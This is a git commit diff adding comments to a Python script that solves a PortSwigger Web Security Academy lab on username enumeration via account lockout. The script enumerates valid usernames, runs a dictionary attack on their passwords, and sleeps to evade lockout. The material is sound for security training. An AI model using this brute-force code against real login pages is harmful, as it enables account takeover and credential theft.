24452b42336f8b20fac2cf1b71c04c1d2f0b4a27
Varun Ashok <varunash010@gmail.com>
2021-02-05 05:36:29 -0500

    Committing the latest script for sending HTTP requests.

--- enumerateAndAttack.py
+++ enumerateAndAttack.py
@@ -1,21 +1,29 @@
+# This script was used for solving one of the username enumeration labs, on Portswigger Web Academy.
+# Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock 
+# 
+# This script was written, just for fun, and it's not meant to replace any other tool.
+#
+
 import requests
 import time
 import sys
 
+# Set the URL. For the portswigger academy, this URL is subject to change frequently.
 url = 'https://aca01f951e8eb562803daf4a00790046.web-security-academy.net/login'
+
 usernames = []
 passwords = []
 
 validUser = raw_input('[+] Please enter valid username (or) Press enter to brute-force valid usernames\n')
 
+# Grab the usernames from the local usernames.txt file
 f = open("usernames.txt","r")
 for x in f:
 	usernames.append(x.strip())
 
 f.close()
 
-# print usernames
-
+# Grab the usernames from the local passwords.txt file
 f = open("passwords.txt", "r")
 for x in f:
 	passwords.append(x.strip())
@@ -24,10 +32,14 @@ f.close()
 
 validUserNames = []
 
+# Set a password (could be anything), to be used for username enumeration.
 password = "test"
 
+# Was the user received as input? If not, brute-force the username
 if not validUser:
 	for username in usernames:
+	
+	# The count here, is just to re-use the same username 5 times. This is used to check, if there was a lockout.
 		for count in range(0,5):
 	
 			myData = {'username':username,'password':password,'count': count}
@@ -46,7 +58,7 @@ if not validUser:
 	
 				if 'Invalid username or password' in x.text:
 					print username + ":" + password + " ==> " + " Response: The username or password was incorrect"
-
+#		Sleep if you want
 #		time.sleep(0.001)
 
 	print "[+] Valid Usernames: " + str(validUserNames)
@@ -55,8 +67,10 @@ print "[+] Starting dictionary attack on valid username"
 
 validCredentials = []
 
+# Count that's used, to monitor whether the user account locked out or not.
 count = 1
 
+# If a valid user was given as input, use that instead.
 if validUser != '':
 	validUserNames.append(validUser)
 
@@ -78,14 +92,17 @@ for validUser in validUserNames:
 			print 'Account is locked out!'
 			count=1
 			time.sleep(60)
-			
+		
+		# The server responded with a 302, which is a redirect. This means, that the login worked.
 		elif x.status_code == 302:
 			print "Found a valid credential! : " + validUser + ":" + password
 			validCredentials.append([validUser, password])
 			break
-
+		
+		# Increment count, so that we don't lockout the useraccount. This doesn't always work, as the user account ends up getting 			# locked anyway, but using this method, it is much lesser frequent.
 		count=count+1
-
+		
+		# If we exceed 3 times, let's sleep, and continue after a minute.
 		if count > 3:
 			count=1
 			print('sleeping')
